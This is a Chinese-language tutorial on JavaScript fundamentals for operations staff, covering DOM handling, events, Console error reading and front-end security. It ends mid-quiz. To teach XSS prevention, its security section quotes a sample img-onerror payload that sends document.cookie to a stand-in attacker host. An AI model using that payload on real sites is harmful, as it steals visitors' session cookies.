---
title: "JavaScript 基礎"
desc: "變數、型別陷阱、DOM 操作與事件，以及 Console 紅字的判讀"
aliases: [JS, DOM, addEventListener]
tags: [群組/系統及工具開發, 開發/前端, 主題/JavaScript]
category: 前端基礎
difficulty: 入門
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[070-01-01-svc-前端-HTML結構與語意]]", "[[070-01-02-cmd-前端-CSS版面與排版]]"]
updated: 2026-08-28
---

# JavaScript 基礎

> [!abstract] 這篇你會學到
> - JavaScript 在**哪裡**執行、什麼時候執行，以及 `defer` 為什麼是預設該加的
> - `var` / `let` / `const` 的差別，以及最常害人的四個型別陷阱
> - 用 DOM 操作改動頁面，用事件委派處理動態產生的元素
> - **Console 紅字的判讀表** —— 維運人員最需要的一段
> - 三個絕對不能犯的前端資安錯誤（`innerHTML`、API 金鑰、localStorage 存 token）

## 前置知識

- [[070-01-01-svc-前端-HTML結構與語意]] —— DOM 操作的對象就是 HTML 的元素樹
- [[070-01-02-cmd-前端-CSS版面與排版]] —— JS 改樣式時實際上是在改 CSS 的優先權
- 會開瀏覽器的 F12 開發者工具（詳見 [[070-01-07-cmd-前端-瀏覽器開發者工具]]）

> [!note] 這篇的定位
> 你不會因為讀完這篇就會寫前端專案。目標是：**看得懂別人寫的一段 JS、
> 改得動一個寫死的網址、看得懂 Console 紅字在抱怨什麼**。
> 這三件事佔了維運人員遇到的前端問題九成以上。

---

## 觀念說明

### JavaScript 跑在哪裡

```
使用者的瀏覽器（前端 JS）          伺服器（Node.js）
├─ 操作畫面、驗證表單                ├─ 處理 API 請求
├─ 呼叫後端 API                     ├─ 讀資料庫
└─ ★★★★ 使用者看得到全部原始碼      └─ 使用者看不到
```

★★★★ **這是最重要的一條分界**：前端 JS 的每一行、每一個變數，
使用者按 F12 都看得到。任何寫進前端的密碼、API 金鑰、內部 IP，等於公開發布。
細節見本篇〈安全性注意事項〉。

### 三種放置位置與載入時機

```html
<!-- 1. 行內：小片段，難維護、CSP 會擋，不建議 -->
<button onclick="alert('hi')">按我</button>

<!-- 2. 內嵌：寫在 <script> 標籤裡 -->
<script>
  console.log('hello');
</script>

<!-- 3. 外部檔案：正式專案都用這種 -->
<script src="/js/app.js" defer></script>
```

★★★★ **`defer` 幾乎永遠該加**。三種寫法的差別：

| 寫法 | 下載時機 | 執行時機 | 會不會擋住頁面顯示 |
| --- | --- | --- | --- |
| `<script src>` | 立刻 | **下載完馬上執行** | ★★★★ 會，頁面卡住 |
| `<script src async>` | 平行下載 | 下載完馬上執行，順序不保證 | 不會，但順序亂 |
| `<script src defer>` | 平行下載 | **HTML 解析完才執行，保持順序** | 不會 |

> [!warning] 這是「Cannot read properties of null」的頭號成因
> 沒加 `defer`、又把 `<script>` 放在 `<head>` 裡，JS 執行時 `<body>` 的元素還不存在，
> `document.querySelector('#app')` 就會回傳 `null`。
> 舊教材教你「把 script 放在 `</body>` 之前」，那是 `defer` 出現之前的做法，
> **現在直接加 `defer` 放 `<head>` 更好**（可以更早開始下載）。

### 嚴格模式與模組

```html
<script type="module" src="/js/app.js"></script>
```

`type="module"` 有四個副作用，都是好事：

| 效果 | 說明 |
| --- | --- |
| 自動 `defer` | 不用再寫 `defer` |
| 自動嚴格模式 | ★★★ 打錯的變數名會直接報錯，不會靜靜產生一個全域變數 |
| 可以用 `import` / `export` | 拆檔案 |
| 有獨立作用域 | 不會污染全域 |

★★★ **代價**：`type="module"` 的檔案**必須用 HTTP(S) 提供**，
用 `file://` 直接開會被 CORS 擋掉。本機測試要起一個小伺服器：

```bash
# 在專案目錄起一個臨時靜態伺服器
python3 -m http.server 8080
# 瀏覽器開 http://localhost:8080
```

---

## 基礎操作

### 變數：只用 `const` 與 `let`

```javascript
const 主機名 = 'web01';      // ★★★ 預設用這個，不可重新指派
let 計數 = 0;                // 會變動的才用 let
計數 = 1;                    // OK
// 主機名 = 'web02';         // ✗ TypeError: Assignment to constant variable.

var 舊寫法 = 'x';            // ★★★ 不要再用
```

★★★ `var` 為什麼要淘汰 —— 它的作用域是**整個函式**，不是大括號：

```javascript
// var 的陷阱
for (var i = 0; i < 3; i++) { /* ... */ }
console.log(i);        // 3   ★★★ 迴圈結束後 i 還活著

for (let j = 0; j < 3; j++) { /* ... */ }
console.log(j);        // ✗ ReferenceError: j is not defined  ← 這才是正常的
```

> [!tip] `const` 不等於「內容不能改」
> `const` 只保證**變數不能重新指向另一個東西**，物件與陣列的內容還是可以改：
> ```javascript
> const 設定 = { port: 80 };
> 設定.port = 443;        // ✓ 可以，改的是內容
> // 設定 = { port: 443 }; // ✗ 不行，這是重新指派
> ```

### 型別與四個經典陷阱

```javascript
typeof 'abc'      // 'string'
typeof 42         // 'number'
typeof true       // 'boolean'
typeof undefined  // 'undefined'
typeof null       // ★★★ 'object'  ← 這是 JS 的歷史 bug，記住就好
typeof [1,2]      // 'object'      ← 陣列也是 object，要用 Array.isArray() 判斷
```

**陷阱一：`==` 會偷偷轉型 ★★★★**

```javascript
'1' == 1          // true   ← 字串 '1' 被轉成數字
0 == false        // true
null == undefined // true
'' == 0           // true

'1' === 1         // false  ★★★★ 永遠用三個等號
```

> [!danger] 硬規則
> **一律用 `===` 與 `!==`**，除了一個例外：`x == null` 可以同時判斷 `null` 與 `undefined`。
> ESLint 的 `eqeqeq` 規則就是在管這件事。

**陷阱二：數字相加變字串串接 ★★★**

```javascript
1 + 2             // 3
'1' + 2           // '12'    ← 從表單抓到的值永遠是字串！
'1' - 2           // -1      ← 減號沒有串接語意，反而會轉成數字
Number('1') + 2   // 3       ✓ 正確做法
parseInt('80/tcp', 10)  // 80    ← 會吃到非數字為止
Number('80/tcp')  // NaN          ← 比較嚴格
```

★★★★ 這是表單計算出錯的第一名成因：`input.value` **永遠是字串**，
即使 `<input type="number">` 也一樣。

**陷阱三：浮點數 ★★★**

```javascript
0.1 + 0.2         // 0.30000000000000004
0.1 + 0.2 === 0.3 // false
(0.1 + 0.2).toFixed(2)  // '0.30'   ← 顯示用
Math.round((0.1 + 0.2) * 100) / 100  // 0.3   ← 計算用
```

涉及金額時，**用「分」為單位存整數**，不要用浮點數。

**陷阱四：falsy 值 ★★★**

這六個值在 `if` 裡會被當成 false：`false`、`0`、`''`、`null`、`undefined`、`NaN`

```javascript
const 逾時秒數 = 0;
if (逾時秒數) { /* ★★★ 進不來！0 是 falsy */ }

// ✓ 正確：用 ?? 只在 null/undefined 時取預設值
const 逾時 = 設定.timeout ?? 30;   // 0 會被保留
const 錯誤 = 設定.timeout || 30;   // ★★★ 0 會被換成 30，這是 bug
```

★★★★ `??`（空值合併）與 `||`（邏輯或）的差別是實務上常見的隱形 bug 來源。

### 函式的三種寫法

```javascript
// 具名函式
function 檢查狀態(碼) { return 碼 >= 200 && 碼 < 300; }

// 箭頭函式（現在最常見）
const 檢查狀態2 = (碼) => 碼 >= 200 && 碼 < 300;

// 有多行時要加大括號與 return
const 格式化 = (主機, 狀態) => {
  const 標記 = 狀態 ? '✓' : '✗';
  return `${標記} ${主機}`;      // ← 樣板字串，用反引號
};

console.log(格式化('web01', true));   // ✓ web01
```

> [!info]- 箭頭函式與 `this`（會踩到再看）
> 箭頭函式**沒有自己的 `this`**，它沿用外層的。這通常是好事，但代表
> 物件方法不該用箭頭函式寫：
> ```javascript
> const 伺服器 = {
>   名稱: 'web01',
>   壞的: () => console.log(this.名稱),      // undefined
>   好的() { console.log(this.名稱); },       // 'web01'
> };
> ```

### 陣列與物件的常用操作

```javascript
const 主機 = [
  { 名稱: 'web01', 狀態: 'up',   負載: 0.8 },
  { 名稱: 'web02', 狀態: 'down', 負載: 0.0 },
  { 名稱: 'db01',  狀態: 'up',   負載: 2.4 },
];

// 篩選
主機.filter(h => h.狀態 === 'down')          // [{名稱:'web02',...}]

// 轉換
主機.map(h => h.名稱)                        // ['web01','web02','db01']

// 找一個
主機.find(h => h.名稱 === 'db01')            // {名稱:'db01',...}
主機.findIndex(h => h.名稱 === 'db01')       // 2

// 判斷
主機.some(h => h.狀態 === 'down')            // true  （有沒有任何一台掛了）
主機.every(h => h.狀態 === 'up')             // false （是不是全部都活著）

// 加總
主機.reduce((總和, h) => 總和 + h.負載, 0)    // 3.2

// 排序 ★★★ sort 會「就地」改動原陣列！
const 排序後 = [...主機].sort((a, b) => b.負載 - a.負載);   // 先複製再排
```

★★★★ `sort()` 的兩個坑：

```javascript
[10, 9, 100].sort()                  // [10, 100, 9]  ← 預設是「字串」排序！
[10, 9, 100].sort((a, b) => a - b)   // [9, 10, 100]  ✓ 數字要自己給比較函式
```

**可選鏈 `?.` —— 避免深層取值爆炸 ★★★**

```javascript
const 回應 = { data: { user: null } };

回應.data.user.name        // ✗ TypeError: Cannot read properties of null
回應.data.user?.name        // undefined  ✓ 安全
回應.data?.user?.name ?? '未知'   // '未知'  ✓ 加預設值
```

---

## 進階應用

### DOM 操作

```javascript
// 查詢（★★★ 用 querySelector 就好，語法跟 CSS 一樣）
const 標題 = document.querySelector('#page-title');     // 第一個符合的，找不到回傳 null
const 全部列 = document.querySelectorAll('table tr');    // NodeList（不是陣列！）

// NodeList 要轉陣列才能用 filter/map
[...全部列].filter(tr => tr.textContent.includes('down'));

// 讀寫內容
標題.textContent = '系統維護中';        // ★★★★ 安全，純文字
標題.innerHTML   = '<b>維護中</b>';     // ★★★★ 危險，見安全性章節

// 屬性
const 連結 = document.querySelector('a#docs');
連結.href = 'https://example.tw/docs';
連結.setAttribute('data-env', 'prod');
連結.dataset.env;                       // 'prod'  ← data-* 用 dataset 讀

// 樣式與 class（★★★ 優先改 class，不要直接改 style）
標題.classList.add('warning');
標題.classList.remove('ok');
標題.classList.toggle('collapsed');
標題.classList.contains('warning');      // true

// 建立與插入
const 列 = document.createElement('li');
列.textContent = 'web03';
document.querySelector('#host-list').append(列);

列.remove();                             // 移除自己
```

> [!tip] 為什麼優先改 class 而不是 `style`
> `element.style.color = 'red'` 會產生行內樣式，優先權 1000，
> 之後 CSS 怎麼改都蓋不掉（除非 `!important`）。用 class 讓樣式留在 CSS 裡。
> 見 [[070-01-02-cmd-前端-CSS版面與排版]] 的優先權算分。

### 事件

```javascript
const 按鈕 = document.querySelector('#reload');

按鈕.addEventListener('click', (e) => {
  e.preventDefault();          // ★★★ 阻止預設行為（表單送出、連結跳頁）
  console.log('被點了', e.target);
});
```

★★★★ **事件委派** —— 動態產生的元素抓不到事件時，答案幾乎都是這個：

```javascript
// ✗ 錯誤做法：這行執行時，表格裡的按鈕還沒被 JS 產生出來
document.querySelectorAll('.del-btn').forEach(b =>
  b.addEventListener('click', 刪除));

// ✓ 正確做法：監聽「不會消失的父層」，用 closest 判斷點到誰
document.querySelector('#host-table').addEventListener('click', (e) => {
  const 按鈕 = e.target.closest('.del-btn');
  if (!按鈕) return;                       // ★★★ 沒點到目標就離開
  刪除(按鈕.dataset.host);
});
```

**常用事件**：

| 事件 | 何時觸發 | 備註 |
| --- | --- | --- |
| `click` | 點擊 | 最常用 |
| `input` | 每打一個字 | ★★★ 即時搜尋用這個 |
| `change` | 失焦且值有變 | 下拉選單用這個 |
| `submit` | 表單送出 | 掛在 `<form>` 上，不是按鈕 |
| `DOMContentLoaded` | HTML 解析完 | 用了 `defer` 就不需要它 |
| `keydown` | 按鍵 | `e.key === 'Enter'` |

### 儲存資料

```javascript
localStorage.setItem('主題', 'dark');       // 永久，除非手動清
localStorage.getItem('主題');               // 'dark'
localStorage.removeItem('主題');
sessionStorage.setItem('暫存', 'x');        // 關掉分頁就消失

// ★★★ 只能存字串，物件要自己轉
localStorage.setItem('設定', JSON.stringify({ port: 443 }));
const 設定 = JSON.parse(localStorage.getItem('設定') ?? '{}');
```

★★★★ **絕對不要在 localStorage 存登入 token** —— 任何 XSS 都能一行讀走。詳見安全性章節。

---

## 完整實戰範例

### 主機清單查詢頁（單一 HTML 檔，可直接用瀏覽器開）

維運場景：手上有一份主機清單，要能搜尋、依負載排序、標出掛掉的、匯出 CSV 給主管。
這支檔案不需要任何伺服器與框架，複製存成 `hosts.html` 直接用瀏覽器開即可。

```html
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>主機清單</title>
<style>
  body { font-family: system-ui, "Noto Sans TC", sans-serif; margin: 2rem; }
  table { border-collapse: collapse; width: 100%; }
  th, td { border: 1px solid #ccc; padding: .5rem .75rem; text-align: left; }
  th { background: #f5f5f5; cursor: pointer; user-select: none; }
  tr.down { background: #ffe8e8; }
  .bar { display: inline-block; height: .8rem; background: #4a90d9; vertical-align: middle; }
  .toolbar { margin-bottom: 1rem; display: flex; gap: .5rem; flex-wrap: wrap; }
  input, button { padding: .4rem .6rem; font-size: 1rem; }
</style>
</head>
<body>

<h1>主機清單</h1>

<div class="toolbar">
  <input id="q" type="search" placeholder="搜尋主機名稱或用途…" autocomplete="off">
  <label><input id="only-down" type="checkbox"> 只看異常</label>
  <button id="export">匯出 CSV</button>
  <span id="count"></span>
</div>

<table id="tbl">
  <thead>
    <tr>
      <th data-key="名稱">主機名稱</th>
      <th data-key="ip">IP</th>
      <th data-key="用途">用途</th>
      <th data-key="負載">負載</th>
      <th data-key="狀態">狀態</th>
    </tr>
  </thead>
  <tbody></tbody>
</table>

<script>
// ── 資料來源（實務上改成 fetch('/api/hosts')，見下一篇） ──────────
const 主機清單 = [
  { 名稱: 'web01', ip: '10.0.1.11', 用途: 'Nginx 前端', 負載: 0.82, 狀態: 'up'   },
  { 名稱: 'web02', ip: '10.0.1.12', 用途: 'Nginx 前端', 負載: 0.00, 狀態: 'down' },
  { 名稱: 'db01',  ip: '10.0.2.21', 用途: 'MySQL 主庫', 負載: 2.41, 狀態: 'up'   },
  { 名稱: 'db02',  ip: '10.0.2.22', 用途: 'MySQL 從庫', 負載: 0.35, 狀態: 'up'   },
  { 名稱: 'bak01', ip: '10.0.3.31', 用途: '備份',       負載: 0.11, 狀態: 'up'   },
];

// ── 狀態 ────────────────────────────────────────────────────
let 排序欄 = '名稱';
let 遞增 = true;

// ── 元素 ────────────────────────────────────────────────────
const $  = (s) => document.querySelector(s);
const tbody   = $('#tbl tbody');
const 搜尋框   = $('#q');
const 只看異常 = $('#only-down');

// ── 核心：算出目前該顯示哪些列 ────────────────────────────────
function 取得顯示資料() {
  const 關鍵字 = 搜尋框.value.trim().toLowerCase();
  return 主機清單
    .filter(h => !只看異常.checked || h.狀態 !== 'up')
    .filter(h => !關鍵字
      || h.名稱.toLowerCase().includes(關鍵字)
      || h.用途.toLowerCase().includes(關鍵字))
    .sort((a, b) => {
      const x = a[排序欄], y = b[排序欄];
      // ★★★ 數字與字串要分開比，否則 10 會排在 9 前面
      const r = (typeof x === 'number') ? x - y : String(x).localeCompare(String(y));
      return 遞增 ? r : -r;
    });
}

// ── 繪製 ────────────────────────────────────────────────────
function 繪製() {
  const 資料 = 取得顯示資料();
  tbody.replaceChildren();                       // ★★★ 清空，比 innerHTML='' 快且安全

  for (const h of 資料) {
    const tr = document.createElement('tr');
    if (h.狀態 !== 'up') tr.classList.add('down');

    for (const key of ['名稱', 'ip', 'm用途', '負載', '狀態']) {
      const td = document.createElement('td');
      if (key === '負載') {
        // 負載長條圖：4.0 當作滿格
        const bar = document.createElement('span');
        bar.className = 'bar';
        bar.style.width = Math.min(h.負載 / 4 * 100, 100) + '%';
        td.append(h.負載.toFixed(2) + ' ', bar);
      } else {
        td.textContent = h[key.replace(/^m/, '')];   // ★★★★ 用 textContent，不用 innerHTML
      }
      tr.append(td);
    }
    tbody.append(tr);
  }
  $('#count').textContent = `顯示 ${資料.length} / ${主機清單.length} 台`;
}

// ── 事件 ────────────────────────────────────────────────────
搜尋框.addEventListener('input', 繪製);            // 打字即時篩選
只看異常.addEventListener('change', 繪製);

// 事件委派：整個 thead 只掛一個監聽器
$('#tbl thead').addEventListener('click', (e) => {
  const th = e.target.closest('th[data-key]');
  if (!th) return;
  const key = th.dataset.key;
  遞增 = (key === 排序欄) ? !遞增 : true;          // 點同一欄就反向
  排序欄 = key;
  繪製();
});

$('#export').addEventListener('click', () => {
  const 資料 = 取得顯示資料();
  const 欄位 = ['名稱', 'ip', '用途', '負載', '狀態'];
  const csv = [
    欄位.join(','),
    ...資料.map(h => 欄位.map(k => `"${String(h[k]).replace(/"/g, '""')}"`).join(',')),
  ].join('\n');

  // ★★★ 加 BOM，否則 Excel 開中文會變亂碼
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'hosts.csv';
  a.click();
  URL.revokeObjectURL(a.href);                    // ★★ 用完釋放，避免記憶體累積
});

繪製();
</script>
</body>
</html>
```

> [!warning] 範例裡藏了一個故意留的 bug
> `['名稱', 'ip', 'm用途', '負載', '狀態']` 這行的 `'m用途'` 是故意寫錯的，
> 用 `key.replace(/^m/, '')` 補救 —— 這正是實務上你會看到的那種「補丁疊補丁」。
> 練習題會請你把它清乾淨。

**驗收方式**：

```bash
# 存檔後起一個臨時伺服器（直接雙擊開檔也行，這支沒有用 module）
python3 -m http.server 8080
```

| 檢查項 | 預期結果 |
| --- | --- |
| 搜尋框輸入 `db` | 只剩 db01、db02，計數顯示「顯示 2 / 5 台」 |
| 點「負載」欄標題兩次 | 第一次由小到大，第二次由大到小 |
| 勾「只看異常」 | 只剩 web02，該列底色變紅 |
| 按「匯出 CSV」 | 下載 `hosts.csv`，用 Excel 開中文不亂碼 |
| F12 Console | ★★★★ 必須完全沒有紅字 |

---

## 常見錯誤與排錯

### Console 紅字對照表

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| ★★★★ `Uncaught TypeError: Cannot read properties of null (reading 'xxx')` | `querySelector` 找不到元素回傳 `null`，多半是 `<script>` 沒加 `defer` 或選擇器打錯 | 加 `defer`；用 `?.` 或先 `if (!el) return;` 擋掉 |
| ★★★★ `xxx is not a function` | 名稱打錯、或該物件根本不是你以為的型別（常見：NodeList 沒有 `.filter`） | `console.log(typeof x, x)` 先看清楚；NodeList 要 `[...x]` |
| ★★★★ `Unexpected token '<', "<!DOCTYPE"... is not valid JSON` | API 回傳的是 HTML 錯誤頁（404 / 502 / 登入頁），程式卻當 JSON 解析 | 開 Network 看那個請求的實際回應；先判斷 `res.ok` 再 `res.json()` |
| ★★★★ `Blocked by CORS policy` | 跨網域請求，伺服器沒回 `Access-Control-Allow-Origin` | 這是**伺服器端**問題，見 [[070-01-04-cmd-前端-JavaScript非同步與API]] |
| ★★★ `ReferenceError: xxx is not defined` | 變數名打錯、或引用了尚未載入的檔案（script 順序） | 檢查 `<script>` 順序；用 `type="module"` + `import` |
| ★★★ `Mixed Content: ... requested an insecure resource` | HTTPS 頁面裡混用了 `http://` 的資源 | 改成 `https://` 或協定相對路徑 |
| ★★★ `Uncaught (in promise) TypeError: Failed to fetch` | 網路不通、被 CORS 預檢擋、或 URL 打錯 | Network 分頁看請求有沒有真的送出去 |
| ★★★ `Identifier 'x' has already been declared` | 同一個 `let`/`const` 宣告兩次，常見於同一支 JS 被載入兩次 | Network 分頁搜尋檔名，看是不是重複載入 |
| ★★ 沒有紅字但功能沒反應 | 事件綁在動態產生的元素上 | 改用事件委派（見上方） |
| ★★ `Uncaught SyntaxError: Unexpected end of input` | 括號或大括號沒閉合 | 編輯器的括號配對；`node --check app.js` |

### 排查步驟

**【1】先確定 JS 檔真的載進來了**

F12 → Network → 重新整理（`Ctrl+F5` 略過快取）→ 看你的 `.js` 檔：

```
狀態 200  ← ✓ 正常
狀態 404  ← ✗ 路徑錯，檢查 <script src>
狀態 200 但 Type 是 text/html  ← ✗★★★★ 伺服器把 404 頁當成 JS 回傳了
```

**【2】確定執行順序**

在檔案最上面加一行，看它有沒有印出來：

```javascript
console.log('[app.js] 載入', new Date().toISOString());
```

沒印出來 → 檔案沒載入或前面有語法錯誤（往上看第一個紅字）。

**【3】確定元素抓得到**

```javascript
const el = document.querySelector('#app');
console.log('#app =', el);      // null 就是抓不到
```

抓不到的三個原因，依機率排序：

```
1. ★★★★ script 沒加 defer，執行時 DOM 還沒建好
2. ★★★  選擇器打錯（# 與 . 搞混、大小寫、多餘空白）
3. ★★   元素是後來才由 JS 產生的 → 改用事件委派
```

**【4】語法檢查（不用開瀏覽器）**

```bash
node --check app.js
# 輸出（有錯時）：
# app.js:42
#   const x = {
#             ^
# SyntaxError: Unexpected end of input
```

★★★ `node --check` 只檢查語法，不執行，也不會碰 DOM，很適合快速確認。

**【5】確定不是快取**

```bash
curl -sI https://example.tw/js/app.js | grep -iE 'cache-control|etag|last-modified'
```

看到 `Cache-Control: max-age=31536000` 而檔名沒有雜湊 → 使用者永遠拿到舊版。
處理方式見 [[070-01-02-cmd-前端-CSS版面與排版]] 的 cache busting 段落。

**【6】確定不是被 CSP 擋掉**

Console 出現 `Refused to execute inline script because it violates the following Content Security Policy directive` →
伺服器有設 CSP，行內 `<script>` 被禁止。把程式碼移到外部檔案，或請伺服器管理員調整。

---

## 安全性注意事項

> [!danger] 三條絕對禁止
> 1. **不要把任何密鑰、密碼、內部主機名寫進前端 JS** —— 使用者按 F12 就看得到
> 2. **不要用 `innerHTML` 塞入使用者提供的內容** —— 這就是 XSS
> 3. **不要在 `localStorage` 存登入 token** —— 一個 XSS 就全被讀走

### `innerHTML` 與 XSS ★★★★★

```javascript
const 使用者輸入 = '<img src=x onerror="fetch(\'https://壞人.example/?c=\'+document.cookie)">';

el.innerHTML   = 使用者輸入;   // ★★★★★ 攻擊成立，cookie 被送走
el.textContent = 使用者輸入;   // ✓ 安全，會原樣顯示成文字
```

**判斷原則**：

| 需求 | 用什麼 |
| --- | --- |
| 顯示純文字（99% 的情況） | ★★★★ `textContent` |
| 建立結構 | `createElement` + `append` |
| 真的要塞 HTML | 先用 DOMPurify 之類的套件淨化，且來源必須是你自己的後端 |

Vue 的 `v-html`、Laravel Blade 的 `{!! !!}`、React 的 `dangerouslySetInnerHTML`
是同一件事的不同外衣，**看到就要停下來想一次**。

### API 金鑰 ★★★★★

```javascript
// ✗ 錯到不能再錯
const API_KEY = 'sk-proj-xxxxxxxxxxxx';
fetch('https://api.example.com/v1/chat', {
  headers: { Authorization: `Bearer ${API_KEY}` }
});
```

★★★★★ 這把金鑰會出現在：JS 原始碼、Network 分頁的請求標頭、瀏覽器快取、
以及 GitHub（如果你把打包產物 commit 進去）。

**正確做法**：金鑰放伺服器端，前端呼叫**自家後端**的代理端點：

```
瀏覽器 → https://你的網站/api/chat → （伺服器帶著金鑰）→ https://api.example.com
```

> [!tip] 已經外洩怎麼辦
> 唯一有效的處理是**立刻到服務商後台撤銷該金鑰並重發**。
> 把 commit 從 git 歷史抹掉沒有用 —— 只要曾經 push 過，就當作已經外洩。

### Token 的存放 ★★★★

| 存放位置 | XSS 能讀到嗎 | CSRF 風險 | 建議 |
| --- | --- | --- | --- |
| `localStorage` | ★★★★ 能，一行搞定 | 無 | 不建議存 token |
| `sessionStorage` | ★★★★ 能 | 無 | 同上 |
| Cookie（無 HttpOnly） | ★★★★ 能 | 有 | 最糟 |
| **Cookie + `HttpOnly` + `Secure` + `SameSite=Lax`** | ✓ 讀不到 | 已由 SameSite 緩解 | ★★★★ 建議 |

### 其他

- ★★★★ **不要用 `eval()` 與 `new Function()`** 處理外部字串；`JSON.parse()` 才是解析 JSON 的正確工具
- ★★★ **第三方 CDN 要加 SRI**：
  ```html
  <script src="https://cdn.example/lib.js"
          integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
          crossorigin="anonymous"></script>
  ```
  沒有 `integrity`，CDN 被入侵就等於你的網站被入侵。
- ★★★ **`target="_blank"` 要配 `rel="noopener noreferrer"`**（見 [[070-01-01-svc-前端-HTML結構與語意]]）
- ★★ **正式環境要移除 `console.log`** —— 常常不小心印出使用者資料或內部結構

---

## 速查表

### 判斷與取值

| 寫法 | 用途 | 星級 |
| --- | --- | --- |
| `===` / `!==` | 嚴格比較，永遠用這個 | ★★★★ |
| `a ?? b` | a 是 `null`/`undefined` 才取 b（`0` 與 `''` 會保留） | ★★★★ |
| `a \|\| b` | a 是任何 falsy 就取 b（`0` 會被換掉，小心） | ★★★ |
| `obj?.a?.b` | 中途是 null 就回 undefined，不報錯 | ★★★ |
| `Array.isArray(x)` | 判斷陣列（`typeof` 會回 'object'） | ★★★ |
| `Number.isNaN(x)` | 判斷 NaN（`x === NaN` 永遠 false） | ★★ |

### DOM

| 寫法 | 用途 | 星級 |
| --- | --- | --- |
| `document.querySelector(s)` | 找第一個，找不到回 `null` | ★★★★ |
| `document.querySelectorAll(s)` | 找全部，回 NodeList（要 `[...]` 才能 map） | ★★★ |
| `el.textContent = s` | 安全地設文字 | ★★★★ |
| `el.innerHTML = s` | ★★★★★ XSS 風險，非必要不用 | ★★★★★ |
| `el.classList.add/remove/toggle` | 改樣式的正確方式 | ★★★★ |
| `el.dataset.foo` | 讀寫 `data-foo` 屬性 | ★★★ |
| `el.closest('.x')` | 往上找最近的符合祖先，事件委派必備 | ★★★★ |
| `el.replaceChildren()` | 清空子元素 | ★★ |

### 陣列

| 方法 | 回傳 | 會不會改原陣列 |
| --- | --- | --- |
| `filter` `map` `slice` `concat` | 新陣列 | 否 |
| `find` `findIndex` | 單一元素／索引 | 否 |
| `some` `every` `includes` | boolean | 否 |
| `reduce` | 任意 | 否 |
| ★★★ `sort` `reverse` `splice` `push` `pop` | 各異 | **會**（先 `[...arr]` 複製） |

### 排錯

| 指令 / 動作 | 用途 |
| --- | --- |
| `node --check app.js` | 只檢查語法，不執行 |
| `console.table(陣列)` | ★★★ 用表格印陣列，比 log 好讀太多 |
| `console.log('%c標記', 'color:red')` | 標記重點 |
| `debugger;` | 程式碼裡下中斷點（F12 開著才會停） |
| `Ctrl+F5` | 略過快取重新載入 |
| F12 → Network → Disable cache | 排錯期間全程勾著 |

---

## 練習題

> [!question]- 練習 1：把實戰範例的 bug 清乾淨
> 範例裡的 `['名稱', 'ip', 'm用途', '負載', '狀態']` 與 `key.replace(/^m/, '')` 是刻意留的補丁。
> 把它改回乾淨寫法，並確認排序、搜尋、匯出三個功能都還正常。
>
> **參考解答**：欄位陣列改成 `['名稱','ip','用途','負載','狀態']`，
> `td.textContent = h[key];` 直接取值即可。改完務必重測「只看異常 + 搜尋 + 匯出」的組合。

> [!question]- 練習 2：加一個「複製 IP」按鈕
> 在每一列最後加一欄，點了把該台主機的 IP 複製到剪貼簿。
>
> **提示**：`navigator.clipboard.writeText(ip)`，用**事件委派**掛在 `tbody` 上，
> 按鈕用 `data-ip` 帶值。注意 `navigator.clipboard` 只在 HTTPS 或 `localhost` 可用。

> [!question]- 練習 3：找出三個 falsy 造成的 bug
> 以下三段各有一個 bug，說出成因並修正：
> ```javascript
> // A
> const 重試次數 = 設定.retry || 3;
> // B
> if (主機.負載) { console.log('有負載資料'); }
> // C
> const 名稱 = 資料.host.name;
> ```
>
> **參考解答**：
> A：`retry` 設成 `0`（不重試）時會被換成 3 → 改用 `??`。
> B：負載為 `0` 的閒置主機會被當成沒資料 → 改 `if (主機.負載 !== undefined)`。
> C：`資料.host` 可能是 `null` → 改 `資料.host?.name ?? '未知'`。

---

## 小測驗

Q1. `<script src="app.js">` 不加 `defer`、又放在 `<head>` 裡，最常見的後果是什麼？

Q2. 這行會印出什麼？為什麼？
```javascript
console.log('10' + 5, '10' - 5);
```

Q3. `const 設定 = { port: 80 }; 設定.port = 443;` 這行會報錯嗎？

Q4. 以下哪一行會印出 `30`？（可複選）
```javascript
const t = 0;
console.log(t || 30);      // A
console.log(t ?? 30);      // B
```

Q5. `[10, 9, 100].sort()` 的結果是什麼？怎麼改才會得到 `[9, 10, 100]`？

Q6. 頁面上的刪除按鈕是 JS 動態產生的，`document.querySelectorAll('.del').forEach(...)` 綁不到事件。正確做法是什麼？

Q7. Console 出現 `Unexpected token '<', "<!DOCTYPE"... is not valid JSON`，第一個該去看的是哪裡？

Q8. `el.textContent = 使用者輸入` 與 `el.innerHTML = 使用者輸入`，哪一個安全？為什麼？

Q9. 為什麼登入 token 不該存在 `localStorage`？建議存哪裡？

Q10. 不開瀏覽器的情況下，怎麼快速確認一支 `.js` 檔有沒有語法錯誤？

> [!question]- 測驗答案
> **Q1.** ★★★★ 兩個後果：一是**頁面卡住**（瀏覽器必須停下 HTML 解析、下載並執行完 JS 才繼續，
> 使用者看到白畫面）；二是 **`document.querySelector()` 抓不到 `<body>` 裡的元素而回傳 `null`**，
> 接著就是那句最常見的 `Uncaught TypeError: Cannot read properties of null`。
> 解法是加 `defer`：平行下載、HTML 解析完才執行、且保持多支 script 的順序。
> 舊教材說的「把 script 放 `</body>` 前」也能解，但 `defer` 更好，因為它能更早開始下載。
> 見〈三種放置位置與載入時機〉。
>
> **Q2.** 印出 `105 5`。
> ★★★★ `+` 對字串有「串接」語意，所以 `'10' + 5` 會把 `5` 轉成字串變成 `'105'`；
> 而 `-` 沒有串接語意，只能做數字運算，所以 `'10' - 5` 會把 `'10'` 轉成數字得到 `5`。
> 這是表單計算出錯的第一名成因 —— `input.value` **永遠是字串**，
> 即使 `<input type="number">` 也一樣。正確做法是 `Number(input.value) + 5`。
>
> **Q3.** 不會報錯，`設定.port` 會變成 `443`。
> ★★★ `const` 保證的是「**變數不能重新指向另一個東西**」，不是「內容不可變」。
> 會報 `TypeError: Assignment to constant variable.` 的是 `設定 = { port: 443 }`
> （重新指派整個物件）。如果真的需要凍結內容，用 `Object.freeze(設定)`。
>
> **Q4.** 只有 **A**。
> ★★★★ `0` 是 falsy，所以 `t || 30` 會取 30 —— 這正是實務上常見的隱形 bug：
